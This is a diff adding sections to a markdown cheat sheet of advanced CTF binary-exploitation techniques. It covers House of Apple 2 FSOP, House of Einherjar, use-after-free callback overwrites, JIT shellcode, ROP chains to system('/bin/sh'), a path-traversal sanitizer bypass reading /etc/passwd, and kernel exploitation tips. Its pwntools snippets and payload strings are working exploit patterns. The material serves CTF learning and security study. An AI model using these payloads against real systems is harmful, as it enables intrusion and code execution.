@@ -1,5 +1,39 @@
 # CTF Pwn - Advanced Techniques
 
+## Table of Contents
+- [Seccomp Advanced Techniques](#seccomp-advanced-techniques)
+  - [openat2 Bypass (New Age Pattern)](#openat2-bypass-new-age-pattern)
+  - [Conditional Buffer Address Restrictions](#conditional-buffer-address-restrictions)
+  - [Shellcode Construction Without Relocations (pwntools)](#shellcode-construction-without-relocations-pwntools)
+  - [Seccomp Analysis from Disassembly](#seccomp-analysis-from-disassembly)
+- [rdx Control in ROP Chains](#rdx-control-in-rop-chains)
+- [House of Apple 2 — FSOP for glibc 2.34+ (0xFun 2026)](#house-of-apple-2-fsop-for-glibc-234-0xfun-2026)
+- [House of Einherjar — Off-by-One Null Byte (0xFun 2026)](#house-of-einherjar-off-by-one-null-byte-0xfun-2026)
+- [VM Signed Comparison Bug (0xFun 2026)](#vm-signed-comparison-bug-0xfun-2026)
+- [BF JIT Unbalanced Bracket → RWX Shellcode (VuwCTF 2025)](#bf-jit-unbalanced-bracket-rwx-shellcode-vuwctf-2025)
+- [Type Confusion in Interpreter (VuwCTF 2025)](#type-confusion-in-interpreter-vuwctf-2025)
+- [Off-by-One Index → Size Corruption (VuwCTF 2025)](#off-by-one-index-size-corruption-vuwctf-2025)
+- [Double win() Call Pattern (VuwCTF 2025)](#double-win-call-pattern-vuwctf-2025)
+- [Use-After-Free (UAF) Exploitation](#use-after-free-uaf-exploitation)
+- [Heap Exploitation](#heap-exploitation)
+- [Custom Allocator Exploitation](#custom-allocator-exploitation)
+- [JIT Compilation Exploits](#jit-compilation-exploits)
+- [Esoteric Language GOT Overwrite](#esoteric-language-got-overwrite)
+- [Heap Overlap via Base Conversion](#heap-overlap-via-base-conversion)
+- [Tree Data Structure Stack Underallocation](#tree-data-structure-stack-underallocation)
+- [DNS Record Buffer Overflow](#dns-record-buffer-overflow)
+- [ASAN Shadow Memory Exploitation](#asan-shadow-memory-exploitation)
+- [Format String with Encoding Constraints + RWX .fini_array Hijack](#format-string-with-encoding-constraints-rwx-fini_array-hijack)
+- [Custom Canary Preservation](#custom-canary-preservation)
+- [Signed Integer Bypass (Negative Quantity)](#signed-integer-bypass-negative-quantity)
+- [Canary-Aware Partial Overflow](#canary-aware-partial-overflow)
+- [Global Buffer Overflow (CSV Injection)](#global-buffer-overflow-csv-injection)
+- [MD5 Preimage Gadget Construction](#md5-preimage-gadget-construction)
+- [Path Traversal Sanitizer Bypass](#path-traversal-sanitizer-bypass)
+- [Kernel Exploitation](#kernel-exploitation)
+
+---
+
 ## Seccomp Advanced Techniques
 
 ### openat2 Bypass (New Age Pattern)
@@ -90,6 +124,167 @@ After calling libc functions (especially `puts`), `rdx` is often clobbered to a 
    # leave sets rsp=rbp, so you get a stack pivot to rbp!
    ```
 3. **Stack pivot via leave;ret** — When re-entering vuln's read code, the `leave;ret` after read pivots the stack to `rbp`. Write your next ROP chain at `rbp+8` in the data you send via read.
+
+---
+
+## House of Apple 2 — FSOP for glibc 2.34+ (0xFun 2026)
+
+**When to use:** Modern glibc (2.34+) removed `__free_hook`/`__malloc_hook`. House of Apple 2 uses FSOP via `_IO_wfile_jumps`.
+
+**Full chain:** UAF → leak libc (unsorted bin fd/bk) → leak heap (safe-linking mangled NULL) → tcache poisoning to `_IO_list_all` → fake FILE → exit triggers shell.
+
+**Fake FILE structure requirements:**
+```python
+fake_file = flat({
+    0x00: b' sh\x00',           # _flags = " sh\x00" (fp starts with " sh")
+    0x20: p64(0),                # _IO_write_base = 0
+    0x28: p64(1),                # _IO_write_ptr = 1 (> _IO_write_base)
+    0x88: p64(heap_addr),        # _lock (valid writable address)
+    0xa0: p64(wide_data_addr),   # _wide_data pointer
+    0xd8: p64(io_wfile_jumps),   # vtable = _IO_wfile_jumps
+}, filler=b'\x00')
+
+fake_wide_data = flat({
+    0x18: p64(0),                # _IO_write_base = 0
+    0x30: p64(0),                # _IO_buf_base = 0
+    0xe0: p64(fake_wide_vtable), # _wide_vtable
+})
+
+fake_wide_vtable = flat({
+    0x68: p64(libc.sym.system),  # __doallocate offset
+})
+```
+
+**Trigger chain:** `exit()` → `_IO_flush_all_lockp` → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `_IO_WDOALLOCATE(fp)` → `system(fp)` where fp = `" sh\x00..."`.
+
+**Safe-linking (glibc 2.32+):** tcache fd pointers are mangled: `fd = ptr ^ (chunk_addr >> 12)`. To poison tcache:
+```python
+# When writing to freed chunk, mangle the target address:
+mangled_fd = target_addr ^ (current_chunk_addr >> 12)
+```
+
+---
+
+## House of Einherjar — Off-by-One Null Byte (0xFun 2026)
+
+**Vulnerability:** Off-by-one NUL at end of `malloc_usable_size` clears `PREV_INUSE` of next chunk.
+
+**Exploit chain:**
+1. Set `prev_size` of next chunk to create fake backward consolidation
+2. Forge largebin-style chunk with `fd/bk` AND `fd_nextsize/bk_nextsize` all pointing to self (passes `unlink_chunk()`)
+3. After consolidation, overlapping chunks enable tcache poisoning
+4. Overwrite `stdout` or `_IO_list_all` for FSOP
+
+**Key requirement:** Self-pointing unlink trick is essential:
+```python
+# Fake chunk at target must have:
+# fd = bk = &fake_chunk
+# fd_nextsize = bk_nextsize = &fake_chunk
+```
+
+---
+
+## VM Signed Comparison Bug (0xFun 2026)
+
+**Pattern (CHAOS ENGINE):** Custom VM STORE opcode checks `offset <= 0xfff` with signed `jle` but no lower bound check.
+
+**Exploit:**
+1. Negative offsets reach function pointer table below data area
+2. Build values byte-by-byte in VM memory using VM arithmetic
+3. LOAD as qwords, compute negative offsets via XOR with 0xFF..FF
+4. Overwrite HALT handler with `system@plt`
+5. Trigger HALT with "sh" string pointer as argument
+
+**General lesson:** Signed vs unsigned comparison bugs in custom VMs are common. Always check bounds in both directions. Function pointer tables near data buffers = easy RCE.
+
+---
+
+## BF JIT Unbalanced Bracket → RWX Shellcode (VuwCTF 2025)
+
+**Pattern (Blazingly Fast Memory Unsafe):** BF JIT compiler uses stack for `[`/`]` control flow. Unbalanced `]` pops values from prologue.
+
+**Vulnerability:** `]` (LOOP_END) pops return address from stack. Without matching `[`, it pops the **tape address** which resides in **RWX memory**.
+
+**Exploit:**
+```python
+# Stage 1: Write shellcode to tape via BF +/- operations, then trigger ]
+# Use - for bytes >127 (0xff = 1 decrement vs 255 increments)
+stage1 = b''
+# Build read(0, tape, 256) shellcode on tape
+shellcode_bytes = asm(shellcraft.read(0, 'r14', 256))
+for byte in shellcode_bytes:
+    if byte <= 127:
+        stage1 += b'+' * byte + b'>'
+    else:
+        stage1 += b'-' * (256 - byte) + b'>'
+stage1 += b']'  # Unbalanced ] jumps to tape (RWX)
+
+# Stage 2: Send full execve("/bin/sh") shellcode via stdin after Stage 1 runs
+```
+
+**Identification:** JIT compilers using stack for bracket matching + RWX tape memory.
+
+---
+
+## Type Confusion in Interpreter (VuwCTF 2025)
+
+**Pattern (Idempotence):** Lambda calculus interpreter's `simplify_normal_order()` unconditionally sets function type to ABS (abstraction), even when it's a VAR (variable).
+
+**Key insight:** VAR's unused bytes 16-23 get interpreted as body pointer. When `print_expression()` encounters type > 2, it dumps raw bytes as UNKNOWN_DATA — flag bytes interpreted as type value trigger the dump.
+
+**General lesson:** Type confusion in interpreters occurs when type tags aren't validated before downcasting. Unused padding bytes in one variant become active fields in another.
+
+---
+
+## Off-by-One Index → Size Corruption (VuwCTF 2025)
+
+**Pattern (Kiwiphone):** Index 0 writes to `entries[-1]`, overlapping a struct's `size` field.
+
+**Exploit chain:**
+1. Write to index 0 with crafted data to set `phonebook.size = 48` (normally 16)
+2. `print_all` now dumps 48 entries, leaking stack canary, saved RBP, and libc return address
+3. Calculate libc base from leaked return address
+4. Write ROP chain into entries 17-22: `[canary] [rbp] [ret] [pop_rdi] [/bin/sh] [system]`
+5. Exit with -1 to trigger return through ROP chain
+
+**Format trick:** Phone format `+48 0 0-0` doubles as valid phone number AND size overwrite value.
+
+---
+
+## Double win() Call Pattern (VuwCTF 2025)
+
+**Pattern (Tōkaidō):** `win()` has `if (attempts++ > 0)` check — first call increments from 0 (fails), second call succeeds.
+
+**Payload:** Stack two return addresses: `b'A'*offset + p64(win) + p64(win)`
+
+**PIE calculation:** When main address is leaked: `base = main_leak - main_offset; win = base + win_offset`.
+
+---
+
+## Use-After-Free (UAF) Exploitation
+
+**Pattern:** Menu create/delete/view where `free()` doesn't NULL pointer.
+
+**Classic UAF flow:**
+1. Create object A (allocates chunk with function pointer)
+2. Leak address via inspect/view (bypass PIE)
+3. Free object A (creates dangling pointer)
+4. Allocate object B of **same size** (reuses freed chunk via tcache)
+5. Object B data overwrites A's function pointer with `win()` address
+6. Trigger A's callback -> jumps to `win()`
+
+**Key insight:** Both structs must be the same size for tcache to reuse the chunk.
+
+```python
+create_report("sighting-0")  # 64-byte struct with callback ptr at +56
+leak = inspect_report(0)      # Leak callback address for PIE bypass
+pie_base = leak - redaction_offset
+win_addr = pie_base + win_offset
+
+delete_report(0)              # Free chunk, dangling pointer remains
+create_signal(b"A"*56 + p64(win_addr))  # Same-size struct overwrites callback
+analyze_report(0)             # Calls dangling pointer -> win()
+```
 
 ---
 
@@ -377,6 +572,32 @@ for (uint64_t ctr = 0; ; ctr++) {
 - Word 1: `<high_byte> c3` (remaining byte + ret)
 
 **Brute-force time:** 32-bit prefix match: ~2^32 hashes (~60s on 8 cores). 16-bit: instant.
+
+## Path Traversal Sanitizer Bypass
+
+**Pattern (Galactic Archives):** Sanitizer skips character after finding banned char.
+
+```python
+# Sanitizer removes '.' and '/' but skips next char after match
+# ../../etc/passwd -> bypass with doubled chars:
+"....//....//etc//passwd"
+# Each '..' becomes '....' (first '.' caught, second skipped, third caught, fourth survives)
+```
+
+**Flag via `/proc/self/fd/N`:**
+- If binary opens flag file but doesn't close fd, read via `/proc/self/fd/3`
+- fd 0=stdin, 1=stdout, 2=stderr, 3=first opened file
+
+## Kernel Exploitation
+
+- Look for vulnerable `lseek` handlers allowing OOB read/write
+- Heap grooming with forked processes
+- SUID binary exploitation via kernel-to-userland buffer overflow
+- Check kernel config for disabled protections:
+  - `CONFIG_SLAB_FREELIST_RANDOM=n` -> sequential heap chunks
+  - `CONFIG_SLAB_MERGE_DEFAULT=n` -> predictable allocations
+
+---
 
 See [rop-and-shellcode.md](rop-and-shellcode.md) for `.fini_array` hijack details.
 
